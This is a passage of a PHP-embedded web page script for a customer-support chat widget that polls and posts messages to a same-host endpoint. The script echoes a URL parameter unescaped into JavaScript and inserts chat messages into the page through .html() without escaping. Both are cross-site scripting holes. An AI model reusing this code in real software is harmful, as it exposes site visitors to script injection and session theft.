var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</div></body></html>